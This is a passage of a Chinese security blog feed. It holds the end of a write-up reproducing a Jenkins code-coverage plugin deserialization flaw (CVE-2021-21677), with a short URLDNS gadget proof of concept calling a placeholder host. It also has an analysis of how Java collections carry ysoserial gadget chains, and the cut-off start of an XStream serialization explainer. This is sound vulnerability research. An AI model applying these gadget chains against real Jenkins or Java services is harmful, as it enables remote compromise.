title="2、构造coverage-report文件"></a>2、构造coverage-report文件</h4><p>根据Security2376Test测试代码注释，尝试使用java.util.IdentityHashMap构造POC，查看IdentityHashMap.readObject发现会对键值对调用readObject来进行对象的恢复。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">    K key = (K) s.readObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">    V value = (V) s.readObject();</span><br><span class="line">    putForCreate(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么考虑可以借用ysoserial链，然后put到IdentityHashMap，就可以链起来。这里我用了URLDNS gadget，因为他比较简单并且依赖的包都是jdk自带的包。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IdentityHashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> IdentityHashMap&lt;&gt;();</span><br><span class="line">HashMap hashMap = getObject(<span class="string">"http://xxx.com"</span>);</span><br><span class="line">map.put(<span class="number">1</span>,hashMap);</span><br></pre></td></tr></table></figure><p>序列化后并命名为coverage-report，覆盖某一个build下的原coverage-report并在页面刷新该build，dnslog上成功记录。</p><p>正常到这里，现在的问题应该是如何通过覆盖率的xml文件构造coverage-report，但是根据漏洞描述，疑似之间从磁盘文件反序列化，并且分析了下代码，感觉覆盖率xml文件转换成对象不太可以实现为我们想要的对象，因此可能该漏洞本身就是直接从磁盘反序列化 页面端无法构造。</p><p>那么利用难度就大大提高了，需要条件：</p><p>1、安装了存在漏洞的插件；</p><p>2、能够上传文件到系统的项目build文件夹下；</p><p>3、具有创建item权限。</p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>就当是一次逆推漏洞的练手项目，最后漏洞实际利用难度大，意义不大。</p><h3 id="0x06-参考链接："><a href="#0x06-参考链接：" class="headerlink" title="0x06 参考链接："></a>0x06 参考链接：</h3><p><a href="https://github.com/jenkinsci/code-coverage-api-plugin" target="_blank" rel="noopener">https://github.com/jenkinsci/code-coverage-api-plugin</a><br><a href="https://blog.csdn.net/zlt995768025/article/details/79360203" target="_blank" rel="noopener">https://blog.csdn.net/zlt995768025/article/details/79360203</a><br><a href="https://repo.jenkins-ci.org/ui/native/releases/io/jenkins/plugins/code-coverage-api/1.4.1" target="_blank" rel="noopener">https://repo.jenkins-ci.org/ui/native/releases/io/jenkins/plugins/code-coverage-api/1.4.1</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jenkins </tag>
            
            <tag> CVE-2021-21677 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化和集合之间的渊源</title>
      <link href="2021/08/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E9%9B%86%E5%90%88%E4%B9%8B%E9%97%B4%E7%9A%84%E6%B8%8A%E6%BA%90/"/>
      <url>2021/08/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E9%9B%86%E5%90%88%E4%B9%8B%E9%97%B4%E7%9A%84%E6%B8%8A%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/251220。" target="_blank" rel="noopener">https://www.anquanke.com/post/id/251220。</a></p><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>如果分析过ysoserial的同学应该经常会遇到将HashMap、HashSet、PriorityQueue等Java集合作为反序列化载体的情况，本次分析的重点就是Java集合和Java反序列化漏洞的关系。</p><p>在ysoserial中，用集合作为反序列化载体的总结如下：</p><table><thead><tr><th>反序列化载体</th><th>Gadget</th></tr></thead><tbody><tr><td>HashMap</td><td>Clojure、Hibernate1、Hibernate2、JSON1、Myfaces1、Myfaces2、ROME、URLDNS</td></tr><tr><td>HashSet</td><td>AspectJWeaver、CommonsCollections6</td></tr><tr><td>PriorityQueue</td><td>BeanShell1、Click1、CommonsCollections2、CommonsCollections4、Jython1</td></tr><tr><td>LinkedHashSet</td><td>Jdk7u21</td></tr><tr><td>Hashtable</td><td>CommonsCollections7</td></tr></tbody></table><h3 id="0x02-Gadget总结"><a href="#0x02-Gadget总结" class="headerlink" title="0x02 Gadget总结"></a>0x02 Gadget总结</h3><h4 id="1、HashMap"><a href="#1、HashMap" class="headerlink" title="1、HashMap"></a>1、HashMap</h4><p>先来看下各个Gadget中涉及HashMap的部分：</p><p>Clojure</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt; HashMap.hash() -&gt; AbstractTableModel$ff19274a.hashCode() -&gt; ...</span><br></pre></td></tr></table></figure><p>Hibernate1和Hibernate2 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt; HashMap.hash() -&gt; org.hibernate.engine.spi.TypedValue.hashCode() -&gt; ...</span><br></pre></td></tr></table></figure><p>JSON1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt; HashMap.putVal() -&gt; javax.management.openmbean.TabularDataSupport.equals() -&gt; ...</span><br></pre></td></tr></table></figure><p>Myfaces1和Myfaces2 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt; HashMap.hash() -&gt; org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression.hashCode() -&gt; ...</span><br></pre></td></tr></table></figure><p>ROME </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt; HashMap.hash() -&gt; com.sun.syndication.feed.impl.ObjectBean.hashCode() -&gt; com.sun.syndication.feed.impl.EqualsBean.beanHashCode() -&gt; ...</span><br></pre></td></tr></table></figure><p>URLDNS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt; HashMap.hash() -&gt; java.net.URL.hashCode() -&gt; ...</span><br></pre></td></tr></table></figure><p>无外乎两种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt; HashMap.hash() -&gt; XXX.hashCode()</span><br><span class="line">HashMap.readObject() -&gt; HashMap.putVal() -&gt; XXX.equals()</span><br></pre></td></tr></table></figure><p>那我们看看这几个方法，HashMap.readObject()中恢复HashMap时调用HashMap.putVal()插入键值对，并且调用HashMap.hash()将返回值作为参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    ......</span><br><span class="line">    Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">    table = tab;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            <span class="comment">// 调用HashMap.putVal()</span></span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HashMap.hash()用于计算key的hash值，会先<strong>获取key.hashCode的值</strong>，再对 hashcode 进行无符号右移操作，再和 hashCode 进行异或 ^ 操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在HashMap.putVal()中多次调用key.equals(k)进行比较，保证HashMap的键唯一的特点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent, <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                ......</span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、HashSet"><a href="#2、HashSet" class="headerlink" title="2、HashSet"></a>2、HashSet</h4><p>ysoserial中以HashSet为入口的是AspectJWeaver 和CommonsCollections6，这两个都是通过HashSet.readObject()调用TiedMapEntry.hashCode()：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject() -&gt; HashMap.put() -&gt; HashMap.hash() -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() -&gt; ...</span><br></pre></td></tr></table></figure><p>HashSet底层是HashMap，readObject()反序列化恢复HashSet实例时需要创建HashMap，将其元素恢复并调用HashMap.put()插入元素，因为HashSet是Object的集合，而HashMap是键值对的集合，put插入时统一以e作为key，<code>PRESENT</code>作为value。HashMap.put是用HashMap.putVal()实现的，所以后续的调用和HashMap的一样。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HashSet.readObject()</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// Create backing HashMap</span></span><br><span class="line">    map = (((HashSet&lt;?&gt;)<span class="keyword">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">            E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HashMap.put()</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、LinkedHashSet"><a href="#3、LinkedHashSet" class="headerlink" title="3、LinkedHashSet"></a>3、LinkedHashSet</h4><p> ysoserial中仅Jdk7u21用到了LinkedHashSet：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject() -&gt; (HashSet)LinkedHashSet.add() -&gt; HashMap.put() -&gt; HashMap.hash() -&gt; TemplatesImpl.hashCode() -&gt; ...</span><br></pre></td></tr></table></figure><p>LinkedHashSet继承了HashSet，底层也是HashMap，内部没有直接定义readObject方法，但是可以调用HashSet.readObject()，跟HashSet的调用一样。</p><h4 id="4、PriorityQueue"><a href="#4、PriorityQueue" class="headerlink" title="4、PriorityQueue"></a>4、PriorityQueue</h4><p><a href="https://www.anquanke.com/post/id/250800" target="_blank" rel="noopener">之前的文章</a>里分析过了，详细不再赘述。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject() -&gt; java.util.PriorityQueue.heapify() -&gt; java.util.PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; XXXComparator.compare()</span><br></pre></td></tr></table></figure><h4 id="5、Hashtable"><a href="#5、Hashtable" class="headerlink" title="5、Hashtable"></a>5、Hashtable</h4><p> ysoserial中CommonsCollections7用到了Hashtable，Hashtable和HashMap类似，不过Hashtable是支持同步的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject() -&gt; Hashtable.reconstitutionPut()-&gt; org.apache.commons.collections.map.AbstractMapDecorator.equals() -&gt; ...</span><br></pre></td></tr></table></figure><p>Hashtable反序列化时创建Entry数组，将key和value通过Hashtable.reconstitutionPut()插入数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold and loadFactor</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ......</span><br><span class="line">    table = <span class="keyword">new</span> Entry&lt;?,?&gt;[length];</span><br><span class="line">    threshold = (<span class="keyword">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            K key = (K)s.readObject();</span><br><span class="line">            V value = (V)s.readObject();</span><br><span class="line">        <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hashtable.reconstitutionPut()为了计算hash和保证键唯一，也调用了hashCode和equals()，CommonsCollections7中用到的是equals()动态加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span> <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x03-Java集合为什么备受青睐"><a href="#0x03-Java集合为什么备受青睐" class="headerlink" title="0x03 Java集合为什么备受青睐?"></a>0x03 Java集合为什么备受青睐?</h3><p>Java所有类都继承于Object。既然都继承于Object，那么所有的类都是有共性的，只要是java对象都可以调用或者重写父类Object的方法。<br>集合可以理解为一个容器，可以储存任意类型的对象。在集合中经常会有比较或者计算Hash的操作，那么自然会频繁使用equals()和hashCode()方法，而equals()和hashCode()都是Object中定义的方法，在不同的类中也进行了重写。为了实现Gadget的动态加载，自然会用到这些方法进行连接。<br>这就能解释为什么Java集合会备受Gadget青睐。</p><p>此时我们可以拓展下，在PriorityQueue中比较时用的是Comparator或Comparable，Comparator是Java中一个重要的接口，被应用于比较或者排序，Comparator也在很多类中实现了。</p><p>除了equals()和hashCode()，上文没有提到的toString也是Object中定义的方法，在Gadget中也常被用到，道理都一样。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">this</span> == obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> getClass().getName() + <span class="string">"@"</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们可以总结如下，在挖掘漏洞时可以作为反序列化的载体，当然除了这些可以以类似的思路进行拓展。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt; ... -&gt; XXX.hashCode()</span><br><span class="line">HashMap.readObject() -&gt; ... -&gt; XXX.equals()</span><br><span class="line">... -&gt; XXX.toString()</span><br><span class="line">PriorityQueue.readObject() -&gt; ... -&gt; Comparator.compare()</span><br></pre></td></tr></table></figure><h3 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h3><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ysoserial </tag>
            
            <tag> JAVA集合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XStream序列化原理分析</title>
      <link href="2021/08/26/XStream%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
      <url>2021/08/26/XStream%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>XStream是一个Java的工具库，主要用于将对象序列化成XML或者将XML反序列化成对象，主要用途是传输、持久化、配置、单元测试。</p><h4 id="1、XStream的序列化转换"><a href="#1、XStream的序列化转换" class="headerlink" title="1、XStream的序列化转换"></a>1、XStream的序列化转换</h4><p>XStream主要用toXML和fromXML进行转换：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XStream.toXML(obj)</span><br><span class="line">XStream.fromXML(str)</span><br></pre></td></tr></table></figure><p>一个转换的例子，将Student实例进行序列化，转换成xml，然后转换回来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> School school;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age, School school)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.school = school;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">"XML反序列化"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">School</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> classNum;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">School</span><span class="params">(String name, <span class="keyword">int</span> classNum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.classNum = classNum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        Student people = <span class="keyword">new</span> Student(<span class="string">"xiaoming"</span>, <span class="number">25</span>, <span class="keyword">new</span> School(<span class="string">"北京大学"</span>,<span class="number">500</span>));</span><br><span class="line">        String xml = xStream.toXML(people);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">        Student object = (Student) xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化后的XML字符串如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xstream.test.Student</span> <span class="attr">serialization</span>=<span class="string">"custom"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xstream.test.Student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">age</span>&gt;</span>25<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>xiaoming<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">school</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>北京大学<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">classNum</span>&gt;</span>500<span class="tag">&lt;/<span class="name">classNum</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xstream.test.Student</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 